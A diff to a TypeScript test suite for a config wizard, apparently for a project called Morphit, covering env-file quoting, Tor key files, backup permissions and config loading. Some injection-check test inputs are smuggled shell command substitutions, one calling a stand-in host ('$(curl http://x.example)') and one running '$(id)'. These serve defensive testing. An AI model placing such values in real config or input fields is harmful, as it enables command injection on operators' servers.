@@ -12,7 +12,7 @@
  * runs as live integration).
  */
 
-import { mkdtempSync, rmSync, readFileSync, statSync, existsSync } from 'node:fs';
+import { mkdtempSync, rmSync, readFileSync, statSync, existsSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -163,7 +163,7 @@ const sampleAnswers: WizardAnswers = {
 	dailyCeiling: 25,
 	contactUrl: 'https://example.com/contact',
 	origin: null,
-	// cp474 — `ens` is REQUIRED by AltNetworkResult and was never added here.
+	// `ens` is REQUIRED by AltNetworkResult and was never added here.
 	altNetworks: { tor: null, lokinet: null, i2pB32: null, i2pName: null, nostr: null, ens: null },
 	feeExplorers: {
 		btc: ['https://blockstream.info/api', 'https://mempool.space/api'],
@@ -210,29 +210,36 @@ const sampleAnswers: WizardAnswers = {
 		source: 'default'
 	},
 	seo: { title: null, description: null, keywords: null },
-	backup: { enabled: false, backupDir: null, retainDays: null, dbContainer: null, dbName: 'morphit_indexer', dbUser: 'morphit_indexer' },
+	backup: {
+		enabled: false,
+		backupDir: null,
+		retainDays: null,
+		dbContainer: null,
+		dbName: 'morphit_indexer',
+		dbUser: 'morphit_indexer'
+	},
 	operatorTag: { tag: 'morphit' },
-	// Part 122 cp39 — disabledAssets fixture field.  The sampleAnswers
+	// disabledAssets fixture field.  The sampleAnswers
 	// fixture had been missing `disabledAssets` since the wizard
-	// step was added in cp30; every writeWizardOutput-based scenario
-	// hit a TypeError until cp39 added it.  Empty list = baseline
+	// step was added; every writeWizardOutput-based scenario
+	// hit a TypeError until a later fix added it.  Empty list = baseline
 	// "accept all assets" instance.  Per-scenario overrides exercise
 	// the populated paths.
 	disabledAssets: { disabledTickers: [] },
-	// cp208 — disabledPaymentMethods fixture field.  Added when the
+	// disabledPaymentMethods fixture field.  Added when the
 	// canonical-payment-method disable step (step 14) landed; without
 	// it every writeWizardOutput-based scenario fails to typecheck.
 	disabledPaymentMethods: { disabledKeys: [] },
-	// Part 121 cp9 — both Matrix surfaces opted-out in the
+	// both Matrix surfaces opted-out in the
 	// baseline fixture.  Per-scenario overrides exercise the
 	// populated paths.
 	matrix: { alertMxid: null, groupRoomAlias: null },
 	mcpServer: { enabled: true },
-	// cp182 — BunkerWeb decision.  Baseline fixture is opted-out;
+	// BunkerWeb decision.  Baseline fixture is opted-out;
 	// the BunkerWeb-on/off rendering paths are exercised by the
 	// dedicated trusted-proxy scenarios below.
 	bunkerWeb: { enabled: false },
-	// cp182 — hardening checklist.  Baseline does not generate the
+	// hardening checklist.  Baseline does not generate the
 	// file; the dedicated hardening scenarios exercise generation.
 	hardening: { generateChecklist: false }
 };
@@ -259,11 +266,15 @@ scenario('writeWizardOutput: morphit.config.env contains operator-tunable keys',
 		const result = writeWizardOutput(sampleAnswers, tmp);
 		const content = readFileSync(result.configPath, 'utf8');
 		assertContains(content, 'MORPHIT_INSTANCE_NAME=test-instance', 'instance name');
-		// cp139-D-1 v2: morphit.config.env is the parseEnv consumer.
+		// v2: morphit.config.env is the parseEnv consumer.
 		// Single-quoted form works for everything except embedded
 		// apostrophes; "A test" has no apostrophe → single-quoted.
-		assertContains(content, "MORPHIT_INSTANCE_TAGLINE='A test'", 'tagline (parseEnv = single-quoted)');
-		// cp193: MORPHIT_RELAY_SIGNUP_DAILY_CEILING is NOT operator-config
+		assertContains(
+			content,
+			"MORPHIT_INSTANCE_TAGLINE='A test'",
+			'tagline (parseEnv = single-quoted)'
+		);
+		// MORPHIT_RELAY_SIGNUP_DAILY_CEILING is NOT operator-config
 		// allowlisted — it must NOT appear in morphit.config.env (doing so
 		// made the indexer reject the config on boot).  It lives in
 		// morphit.env now; asserted in the critical-infra scenario below.
@@ -301,10 +312,14 @@ scenario('writeWizardOutput: morphit.env contains critical-infra keys', () => {
 		assertContains(content, 'MORPHIT_INDEXER_RELAY_ACCOUNT=testrelay', 'indexer relay account');
 		assertContains(content, 'MORPHIT_INDEXER_FEE_RECIPIENT=testrelay', 'fees account');
 		assertContains(content, 'MORPHIT_RELAY_ACTIVE_KEY_FILE=', 'key file');
-		// cp193 — these non-allowlisted keys moved here from
+		// these non-allowlisted keys moved here from
 		// morphit.config.env (where they crashed the indexer on boot).
-		assertContains(content, 'MORPHIT_RELAY_SIGNUP_DAILY_CEILING=25', 'signup ceiling now in morphit.env');
-		// cp194 — two REQUIRED indexer vars the wizard previously never
+		assertContains(
+			content,
+			'MORPHIT_RELAY_SIGNUP_DAILY_CEILING=25',
+			'signup ceiling now in morphit.env'
+		);
+		// two REQUIRED indexer vars the wizard previously never
 		// wrote, so a wizard-configured indexer failed Zod validation at
 		// boot ("MORPHIT_INDEXER_PUBLIC_ORIGIN: Required" + posting pubkey).
 		assertContains(content, 'MORPHIT_INDEXER_PUBLIC_ORIGIN', 'indexer public origin written');
@@ -326,29 +341,63 @@ scenario('writeWizardOutput: morphit.env contains critical-infra keys', () => {
 	}
 });
 
-// cp193 — REGRESSION GUARD for the boot-crash the VPS sysadmin hit:
+// REGRESSION GUARD for the boot-crash the VPS sysadmin hit:
 // the wizard wrote MORPHIT_RELAY_SIGNUP_DAILY_CEILING (and
 // _TRUSTED_PROXY_IPS) into morphit.config.env, but those keys are not
 // on the operator-config allowlist, so loadOperatorConfig() threw
 // "[operator-config] ... contains keys not in the operator allowlist"
 // and the indexer refused to boot.  This renders the wizard's config
 // and runs it through the REAL loader to prove it is accepted.
-scenario('writeWizardOutput: generated morphit.config.env is accepted by loadOperatorConfig (cp193 boot regression)', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	const priorOverride = process.env.MORPHIT_OPERATOR_CONFIG_FILE;
-	try {
-		const result = writeWizardOutput(sampleAnswers, tmp);
-		process.env.MORPHIT_OPERATOR_CONFIG_FILE = result.configPath;
-		// Must not throw. If it throws an allowlist error, the wizard
-		// produced a config the indexer can't boot with.
-		loadOperatorConfig();
-		assertTrue(true, 'loadOperatorConfig accepted the wizard config');
-	} finally {
-		if (priorOverride === undefined) delete process.env.MORPHIT_OPERATOR_CONFIG_FILE;
-		else process.env.MORPHIT_OPERATOR_CONFIG_FILE = priorOverride;
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: generated morphit.config.env is accepted by loadOperatorConfig (cp193 boot regression)',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		const priorOverride = process.env.MORPHIT_OPERATOR_CONFIG_FILE;
+		try {
+			const result = writeWizardOutput(sampleAnswers, tmp);
+			process.env.MORPHIT_OPERATOR_CONFIG_FILE = result.configPath;
+			// Must not throw. If it throws an allowlist error, the wizard
+			// produced a config the indexer can't boot with.
+			loadOperatorConfig();
+			assertTrue(true, 'loadOperatorConfig accepted the wizard config');
+		} finally {
+			if (priorOverride === undefined) delete process.env.MORPHIT_OPERATOR_CONFIG_FILE;
+			else process.env.MORPHIT_OPERATOR_CONFIG_FILE = priorOverride;
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
+
+// the refused assets / payment methods have ONE home, morphit.config.env
+// (allowlisted), where OPERATIONS tells operators to put them — a config.env
+// carrying them used to stop the indexer booting.
+scenario(
+	'writeWizardOutput: refused assets + payment methods live in morphit.config.env, and it loads',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		const priorOverride = process.env.MORPHIT_OPERATOR_CONFIG_FILE;
+		try {
+			const result = writeWizardOutput(sampleAnswers, tmp);
+			const cfg = readFileSync(result.configPath, 'utf8');
+			const env = readFileSync(result.envPath, 'utf8');
+			for (const k of [
+				'MORPHIT_INDEXER_DISABLED_ASSETS',
+				'MORPHIT_INDEXER_DISABLED_PAYMENT_METHODS'
+			]) {
+				assertTrue(new RegExp(`^${k}=`, 'm').test(cfg), `${k} in morphit.config.env`);
+				assertTrue(!new RegExp(`^${k}=`, 'm').test(env), `${k} not also in morphit.env`);
+			}
+			writeFileSync(result.configPath, `${cfg}MORPHIT_INDEXER_DISABLED_ASSETS="USDT,DAI"\n`);
+			process.env.MORPHIT_OPERATOR_CONFIG_FILE = result.configPath;
+			loadOperatorConfig();
+			assertTrue(true, 'a hand-edited config.env with the key loads');
+		} finally {
+			if (priorOverride === undefined) delete process.env.MORPHIT_OPERATOR_CONFIG_FILE;
+			else process.env.MORPHIT_OPERATOR_CONFIG_FILE = priorOverride;
+			rmSync(tmp, { recursive: true, force: true });
+		}
+	}
+);
 
 scenario('writeWizardOutput: morphit.config.env does NOT contain critical-infra keys', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -375,35 +424,41 @@ scenario('writeWizardOutput: omits optional keys when null', () => {
 	}
 });
 
-scenario('writeWizardOutput: writes the 3 Tor HS files + the address env var when torOnion present', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const onion = generateOnionV3();
-		const withTor: WizardAnswers = {
-			...sampleAnswers,
-			altNetworks: { ...sampleAnswers.altNetworks, tor: onion.address },
-			torOnion: onion
-		};
-		const result = writeWizardOutput(withTor, tmp);
-		assertTrue(result.torHsDir !== null, 'torHsDir reported');
-		assertTrue(result.torHsAddress === onion.address, 'torHsAddress reported');
-		const dir = result.torHsDir as string;
-		const sec = join(dir, 'hs_ed25519_secret_key');
-		const pub = join(dir, 'hs_ed25519_public_key');
-		const host = join(dir, 'hostname');
-		assertTrue(existsSync(sec) && statSync(sec).size === 96, 'secret key is 96 bytes');
-		assertTrue((statSync(sec).mode & 0o077) === 0, 'secret key is owner-only');
-		assertTrue(existsSync(pub) && statSync(pub).size === 64, 'public key is 64 bytes');
-		assertTrue(readFileSync(host, 'utf8') === onion.address + '\n', 'hostname = address + newline');
-		const cfg = readFileSync(result.configPath, 'utf8');
-		assertTrue(
-			cfg.includes('MORPHIT_INSTANCE_TOR_ADDRESS=') && cfg.includes(onion.address),
-			'config carries the tor address env var'
-		);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: writes the 3 Tor HS files + the address env var when torOnion present',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const onion = generateOnionV3();
+			const withTor: WizardAnswers = {
+				...sampleAnswers,
+				altNetworks: { ...sampleAnswers.altNetworks, tor: onion.address },
+				torOnion: onion
+			};
+			const result = writeWizardOutput(withTor, tmp);
+			assertTrue(result.torHsDir !== null, 'torHsDir reported');
+			assertTrue(result.torHsAddress === onion.address, 'torHsAddress reported');
+			const dir = result.torHsDir as string;
+			const sec = join(dir, 'hs_ed25519_secret_key');
+			const pub = join(dir, 'hs_ed25519_public_key');
+			const host = join(dir, 'hostname');
+			assertTrue(existsSync(sec) && statSync(sec).size === 96, 'secret key is 96 bytes');
+			assertTrue((statSync(sec).mode & 0o077) === 0, 'secret key is owner-only');
+			assertTrue(existsSync(pub) && statSync(pub).size === 64, 'public key is 64 bytes');
+			assertTrue(
+				readFileSync(host, 'utf8') === onion.address + '\n',
+				'hostname = address + newline'
+			);
+			const cfg = readFileSync(result.configPath, 'utf8');
+			assertTrue(
+				cfg.includes('MORPHIT_INSTANCE_TOR_ADDRESS=') && cfg.includes(onion.address),
+				'config carries the tor address env var'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
 scenario('writeWizardOutput: no Tor HS dir when no onion was generated', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -411,41 +466,47 @@ scenario('writeWizardOutput: no Tor HS dir when no onion was generated', () => {
 		const noTor: WizardAnswers = { ...sampleAnswers, torOnion: null };
 		const result = writeWizardOutput(noTor, tmp);
 		assertTrue(result.torHsDir === null, 'no torHsDir reported');
-		assertTrue(!existsSync(join(tmp, 'tor-hidden-service')), 'no tor-hidden-service directory written');
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
-	}
-});
-
-scenario('writeWizardOutput: hardening checklist reflects the operator\u2019s pillar confirmations', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const withHard: WizardAnswers = {
-			...sampleAnswers,
-			hardening: {
-				generateChecklist: true,
-				sshLockdown: true,
-				firewall: true,
-				autoUpdates: true,
-				kernelHardening: true,
-				intrusionDetection: false
-			}
-		};
-		const result = writeWizardOutput(withHard, tmp);
-		assertTrue(result.hardeningChecklistPath !== null, 'checklist written');
-		const md = readFileSync(result.hardeningChecklistPath as string, 'utf8');
-		assertTrue(md.includes('During setup you confirmed'), 'confirmation summary present');
-		assertTrue(md.includes('[x] SSH lockdown'), 'a confirmed pillar is checked');
 		assertTrue(
-			md.includes('[ ] Intrusion detection') && md.includes('strongly reconsider'),
-			'a declined pillar is unchecked + flagged'
+			!existsSync(join(tmp, 'tor-hidden-service')),
+			'no tor-hidden-service directory written'
 		);
 	} finally {
 		rmSync(tmp, { recursive: true, force: true });
 	}
 });
 
-// ─── cp139-D-1: per-consumer quote-format split ─────────────────
+scenario(
+	'writeWizardOutput: hardening checklist reflects the operator\u2019s pillar confirmations',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const withHard: WizardAnswers = {
+				...sampleAnswers,
+				hardening: {
+					generateChecklist: true,
+					sshLockdown: true,
+					firewall: true,
+					autoUpdates: true,
+					kernelHardening: true,
+					intrusionDetection: false
+				}
+			};
+			const result = writeWizardOutput(withHard, tmp);
+			assertTrue(result.hardeningChecklistPath !== null, 'checklist written');
+			const md = readFileSync(result.hardeningChecklistPath as string, 'utf8');
+			assertTrue(md.includes('During setup you confirmed'), 'confirmation summary present');
+			assertTrue(md.includes('[x] SSH lockdown'), 'a confirmed pillar is checked');
+			assertTrue(
+				md.includes('[ ] Intrusion detection') && md.includes('strongly reconsider'),
+				'a declined pillar is unchecked + flagged'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
+	}
+);
+
+// ─── per-consumer quote-format split ─────────────────
 //
 // morphit.config.env → parseEnv consumer (operator-config package).
 //   Format: double-quoted.  parseEnv does NOT expand $/backtick
@@ -459,7 +520,7 @@ scenario('writeWizardOutput: hardening checklist reflects the operator\u2019s pi
 //   expansion.  Apostrophes use the POSIX close-escape-reopen
 //   idiom which bash understands but parseEnv doesn't.
 //
-// cp139-C-11 first switched both to single-quoted; cp139-D-1
+// A later change first switched both to single-quoted
 // discovered the parseEnv/POSIX mismatch and split by consumer.
 
 scenario('cp231: empty tagline omits MORPHIT_INSTANCE_TAGLINE entirely', () => {
@@ -489,7 +550,7 @@ scenario('cp139-D-1: $HOME in tagline (parseEnv consumer) is single-quoted', () 
 		const answers: WizardAnswers = { ...sampleAnswers, tagline: 'Morphit $HOME instance' };
 		const result = writeWizardOutput(answers, tmp);
 		const content = readFileSync(result.configPath, 'utf8');
-		// cp139-D-1 v2: prefer single-quoted in parseEnv consumer
+		// v2: prefer single-quoted in parseEnv consumer
 		// (no apostrophe in value → single-quoted works).  parseEnv
 		// reads $HOME inside single-quotes literally; bash never
 		// sources morphit.config.env so the would-be bash expansion
@@ -500,44 +561,54 @@ scenario('cp139-D-1: $HOME in tagline (parseEnv consumer) is single-quoted', () 
 	}
 });
 
-scenario('cp139-D-1: command-substitution $(...) in tagline is single-quoted (parseEnv literal)', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			tagline: 'evil $(curl http://x.example) instance'
-		};
-		const result = writeWizardOutput(answers, tmp);
-		const content = readFileSync(result.configPath, 'utf8');
-		// parseEnv reads $(curl ...) inside single-quotes literally.
-		assertContains(
-			content,
-			"MORPHIT_INSTANCE_TAGLINE='evil $(curl http://x.example) instance'",
-			'single-quoted (parseEnv literal)'
-		);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'cp139-D-1: command-substitution $(...) in tagline is single-quoted (parseEnv literal)',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				tagline: 'evil $(curl http://x.example) instance'
+			};
+			const result = writeWizardOutput(answers, tmp);
+			const content = readFileSync(result.configPath, 'utf8');
+			// parseEnv reads $(curl ...) inside single-quotes literally.
+			assertContains(
+				content,
+				"MORPHIT_INSTANCE_TAGLINE='evil $(curl http://x.example) instance'",
+				'single-quoted (parseEnv literal)'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-scenario("cp139-D-1: embedded apostrophe in tagline falls back to double-quoted (parseEnv consumer)", () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			tagline: "alice's morphit"
-		};
-		const result = writeWizardOutput(answers, tmp);
-		const content = readFileSync(result.configPath, 'utf8');
-		// Apostrophe in value → can't use single-quoted (parseEnv
-		// doesn't support POSIX close-escape-reopen).  Fall back to
-		// double-quoted; parseEnv reads $ inside double-quotes
-		// literally (no expansion).  Apostrophe survives verbatim.
-		assertContains(content, 'MORPHIT_INSTANCE_TAGLINE="alice\'s morphit"', 'double-quoted fallback');
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'cp139-D-1: embedded apostrophe in tagline falls back to double-quoted (parseEnv consumer)',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				tagline: "alice's morphit"
+			};
+			const result = writeWizardOutput(answers, tmp);
+			const content = readFileSync(result.configPath, 'utf8');
+			// Apostrophe in value → can't use single-quoted (parseEnv
+			// doesn't support POSIX close-escape-reopen).  Fall back to
+			// double-quoted; parseEnv reads $ inside double-quotes
+			// literally (no expansion).  Apostrophe survives verbatim.
+			assertContains(
+				content,
+				'MORPHIT_INSTANCE_TAGLINE="alice\'s morphit"',
+				'double-quoted fallback'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
 scenario('cp139-D-1: bare-safe values still emit without quotes', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -556,7 +627,7 @@ scenario('cp139-D-1: bare-safe values still emit without quotes', () => {
 	}
 });
 
-scenario("cp139-D-1: bash consumer (morphit.env critical-infra) stays single-quoted", () => {
+scenario('cp139-D-1: bash consumer (morphit.env critical-infra) stays single-quoted', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
 	try {
 		// morphit.env's writable values (DB URL + RPC list) are
@@ -597,13 +668,13 @@ scenario(
 			// "Joe's $5" landed in double quotes where bash expanded $5.
 			const answers: WizardAnswers = {
 				...sampleAnswers,
-				tagline: "alice's \"first\" morphit $(id)"
+				tagline: 'alice\'s "first" morphit $(id)'
 			};
 			const result = writeWizardOutput(answers, tmp);
 			const content = readFileSync(result.configPath, 'utf8');
 			assertContains(
 				content,
-				"MORPHIT_INSTANCE_TAGLINE='alice\u2019s \"first\" morphit $(id)'",
+				'MORPHIT_INSTANCE_TAGLINE=\'alice\u2019s "first" morphit $(id)\'',
 				'single-quoted, apostrophe as ’'
 			);
 			assertTrue(
@@ -616,114 +687,105 @@ scenario(
 	}
 );
 
-// ─── cp139-D-1: parseEnv round-trip invariant ───────────────────
+// ─── parseEnv round-trip invariant ───────────────────
 //
 // The big regression sentinel: the wizard's emitted morphit.config.env
 // must round-trip cleanly through Node's parseEnv (operator-config's
-// consumer).  This is the test that would have CAUGHT cp139-D-1 if
-// it had existed at cp139-C-11 ship time.
+// consumer).  This is the test that would have CAUGHT if
+// it had existed at the time.
 
-scenario(
-	"cp139-D-1 round-trip: tagline with apostrophe survives parseEnv read-back",
-	() => {
-		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-		try {
-			// "Berlin's first Morphit node." — the EXACT example string
-			// stepTagline shows the operator.  cp139-C-11 would have
-			// emitted this as 'Berlin'\''s first Morphit node.' which
-			// parseEnv truncates to "Berlin" silently.
-			const answers: WizardAnswers = {
-				...sampleAnswers,
-				tagline: "Berlin's first Morphit node."
-			};
-			const result = writeWizardOutput(answers, tmp);
-			const content = readFileSync(result.configPath, 'utf8');
-			const parsed = parseEnv(content);
-			assertTrue(
-				parsed.MORPHIT_INSTANCE_TAGLINE === "Berlin's first Morphit node.",
-				`round-trip failed: parsed = ${JSON.stringify(parsed.MORPHIT_INSTANCE_TAGLINE)}, expected "Berlin's first Morphit node."`
-			);
-		} finally {
-			rmSync(tmp, { recursive: true, force: true });
-		}
+scenario('cp139-D-1 round-trip: tagline with apostrophe survives parseEnv read-back', () => {
+	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+	try {
+		// "Berlin's first Morphit node." — the EXACT example string
+		// stepTagline shows the operator.  would have
+		// emitted this as 'Berlin'\''s first Morphit node.' which
+		// parseEnv truncates to "Berlin" silently.
+		const answers: WizardAnswers = {
+			...sampleAnswers,
+			tagline: "Berlin's first Morphit node."
+		};
+		const result = writeWizardOutput(answers, tmp);
+		const content = readFileSync(result.configPath, 'utf8');
+		const parsed = parseEnv(content);
+		assertTrue(
+			parsed.MORPHIT_INSTANCE_TAGLINE === "Berlin's first Morphit node.",
+			`round-trip failed: parsed = ${JSON.stringify(parsed.MORPHIT_INSTANCE_TAGLINE)}, expected "Berlin's first Morphit node."`
+		);
+	} finally {
+		rmSync(tmp, { recursive: true, force: true });
 	}
-);
+});
 
-scenario(
-	"cp139-D-1 round-trip: tagline with $HOME survives parseEnv read-back as literal",
-	() => {
-		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-		try {
-			const answers: WizardAnswers = {
-				...sampleAnswers,
-				tagline: 'My $HOME node'
-			};
-			const result = writeWizardOutput(answers, tmp);
-			const content = readFileSync(result.configPath, 'utf8');
-			const parsed = parseEnv(content);
-			// parseEnv doesn't expand $ inside double-quotes (dotenv
-			// semantics); the literal string $HOME survives.
-			assertTrue(
-				parsed.MORPHIT_INSTANCE_TAGLINE === 'My $HOME node',
-				`round-trip failed: parsed = ${JSON.stringify(parsed.MORPHIT_INSTANCE_TAGLINE)}`
-			);
-		} finally {
-			rmSync(tmp, { recursive: true, force: true });
-		}
+scenario('cp139-D-1 round-trip: tagline with $HOME survives parseEnv read-back as literal', () => {
+	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+	try {
+		const answers: WizardAnswers = {
+			...sampleAnswers,
+			tagline: 'My $HOME node'
+		};
+		const result = writeWizardOutput(answers, tmp);
+		const content = readFileSync(result.configPath, 'utf8');
+		const parsed = parseEnv(content);
+		// parseEnv doesn't expand $ inside double-quotes (dotenv
+		// semantics); the literal string $HOME survives.
+		assertTrue(
+			parsed.MORPHIT_INSTANCE_TAGLINE === 'My $HOME node',
+			`round-trip failed: parsed = ${JSON.stringify(parsed.MORPHIT_INSTANCE_TAGLINE)}`
+		);
+	} finally {
+		rmSync(tmp, { recursive: true, force: true });
 	}
-);
+});
 
-scenario(
-	"cp139-D-1 round-trip: every config field round-trips through parseEnv",
-	() => {
-		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-		try {
-			// Hostile-ish values that hit the non-bare-safe regex path
-			// in each operator-tunable field.  All must round-trip
-			// through Node's parseEnv (the canonical consumer for
-			// morphit.config.env).
-			const answers: WizardAnswers = {
-				...sampleAnswers,
-				instanceName: 'My Test Node',  // space → quote path
-				tagline: "alice's tagline with $HOME",  // apostrophe + $ → ’ + single quotes (v1.19.0)
-				contactUrl: 'https://example.com/contact?to=alice@example.com',  // @ + ? + =
-				origin: 'https://my-morphit.example.com:8443',  // : (bare-safe)
-				operatorTag: {
-					tag: 'my-org.morphit-instance'  // bare-safe
-				},
-				seo: {
-					title: "morphit's first instance",  // apostrophe → double-quoted fallback
-					description: null,
-					keywords: null
-				}
-			};
-			const result = writeWizardOutput(answers, tmp);
-			const content = readFileSync(result.configPath, 'utf8');
-			const parsed = parseEnv(content);
-
-			// All fields below are in morphit.config.env (parseEnv
-			// consumer).  OPERATOR_TAG lives in morphit.env per
-			// render.ts (bash consumer) and is exercised by a
-			// separate bash-consumer round-trip in edit-smoke.
-			const checks: Array<[string, string]> = [
-				['MORPHIT_INSTANCE_NAME', 'My Test Node'],
-				// ' next to $ → ’ (bash would expand $HOME in double quotes).
-				['MORPHIT_INSTANCE_TAGLINE', 'alice\u2019s tagline with $HOME'],
-				['MORPHIT_INSTANCE_CONTACT_URL', 'https://example.com/contact?to=alice@example.com'],
-				['MORPHIT_INSTANCE_ORIGIN', 'https://my-morphit.example.com:8443'],
-				['MORPHIT_INSTANCE_SEO_TITLE', "morphit's first instance"]
-			];
-			for (const [key, expected] of checks) {
-				assertTrue(
-					parsed[key] === expected,
-					`${key}: parsed=${JSON.stringify(parsed[key])}, expected=${JSON.stringify(expected)}`
-				);
+scenario('cp139-D-1 round-trip: every config field round-trips through parseEnv', () => {
+	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+	try {
+		// Hostile-ish values that hit the non-bare-safe regex path
+		// in each operator-tunable field.  All must round-trip
+		// through Node's parseEnv (the canonical consumer for
+		// morphit.config.env).
+		const answers: WizardAnswers = {
+			...sampleAnswers,
+			instanceName: 'My Test Node', // space → quote path
+			tagline: "alice's tagline with $HOME", // apostrophe + $ → ’ + single quotes (v1.19.0)
+			contactUrl: 'https://example.com/contact?to=alice@example.com', // @ + ? + =
+			origin: 'https://my-morphit.example.com:8443', // : (bare-safe)
+			operatorTag: {
+				tag: 'my-org.morphit-instance' // bare-safe
+			},
+			seo: {
+				title: "morphit's first instance", // apostrophe → double-quoted fallback
+				description: null,
+				keywords: null
 			}
-		} finally {
-			rmSync(tmp, { recursive: true, force: true });
+		};
+		const result = writeWizardOutput(answers, tmp);
+		const content = readFileSync(result.configPath, 'utf8');
+		const parsed = parseEnv(content);
+
+		// All fields below are in morphit.config.env (parseEnv
+		// consumer).  OPERATOR_TAG lives in morphit.env per
+		// render.ts (bash consumer) and is exercised by a
+		// separate bash-consumer round-trip in edit-smoke.
+		const checks: Array<[string, string]> = [
+			['MORPHIT_INSTANCE_NAME', 'My Test Node'],
+			// ' next to $ → ’ (bash would expand $HOME in double quotes).
+			['MORPHIT_INSTANCE_TAGLINE', 'alice\u2019s tagline with $HOME'],
+			['MORPHIT_INSTANCE_CONTACT_URL', 'https://example.com/contact?to=alice@example.com'],
+			['MORPHIT_INSTANCE_ORIGIN', 'https://my-morphit.example.com:8443'],
+			['MORPHIT_INSTANCE_SEO_TITLE', "morphit's first instance"]
+		];
+		for (const [key, expected] of checks) {
+			assertTrue(
+				parsed[key] === expected,
+				`${key}: parsed=${JSON.stringify(parsed[key])}, expected=${JSON.stringify(expected)}`
+			);
 		}
+	} finally {
+		rmSync(tmp, { recursive: true, force: true });
 	}
-);
+});
 
 scenario('writeWizardOutput: writes MORPHIT_INSTANCE_ORIGIN when origin set', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -833,7 +895,7 @@ scenario('writeWizardOutput: alt-network addresses written when present', () => 
 				i2pB32: 'xyz.b32.i2p',
 				i2pName: 'morphit.i2p',
 				nostr: null,
-				// cp474 — REQUIRED by AltNetworkResult and absent until now. Absent it
+				// REQUIRED by AltNetworkResult and absent until now. Absent it
 				// read `undefined`, and render.ts gates on `altNetworks.ens !== null`
 				// — which `undefined` PASSES — so this fixture was rendering a junk
 				// `MORPHIT_INSTANCE_ENS_NAME=undefined` line that nothing asserted on.
@@ -846,7 +908,7 @@ scenario('writeWizardOutput: alt-network addresses written when present', () => 
 		assertContains(content, 'MORPHIT_INSTANCE_TOR_ADDRESS=abc.onion', 'tor written');
 		assertContains(content, 'MORPHIT_INSTANCE_I2P_B32_ADDRESS=xyz.b32.i2p', 'i2p b32 written');
 		assertContains(content, 'MORPHIT_INSTANCE_I2P_NAME_ADDRESS=morphit.i2p', 'i2p name written');
-		// cp474 — the ENS write path had no coverage at all.
+		// the ENS write path had no coverage at all.
 		assertContains(content, 'MORPHIT_INSTANCE_ENS_NAME=morphit.eth', 'ens written');
 		assertTrue(!content.includes('MORPHIT_INSTANCE_I2P_ADDRESS='), 'no legacy single-i2p key');
 		assertTrue(!content.includes('MORPHIT_INSTANCE_LOKINET_ADDRESS'), 'no lokinet');
@@ -856,7 +918,7 @@ scenario('writeWizardOutput: alt-network addresses written when present', () => 
 	}
 });
 
-// ─── Backup automation (Audit Part 32) ───────────────────────────
+// ─── Backup automation ───────────────────────────
 
 scenario('writeWizardOutput: backup disabled writes no backup.env', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -922,7 +984,7 @@ scenario('writeWizardOutput: backup.env has 0600 permissions', () => {
 	}
 });
 
-// ─── Part 121 cp9 — Matrix surface emission ───────────────────────
+// ─── Matrix surface emission ───────────────────────
 
 scenario('writeWizardOutput: both Matrix surfaces opted-out → no Matrix block in env', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -940,54 +1002,57 @@ scenario('writeWizardOutput: both Matrix surfaces opted-out → no Matrix block 
 	}
 });
 
-scenario('writeWizardOutput: only MXID populated → only MORPHIT_MATRIX_BOT_ALERT_MXID emitted', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			matrix: { alertMxid: '@alice:matrix.org', groupRoomAlias: null }
-		};
-		writeWizardOutput(answers, tmp);
-		const env = readFileSync(join(tmp, 'morphit.config.env'), 'utf-8');
-		assertTrue(
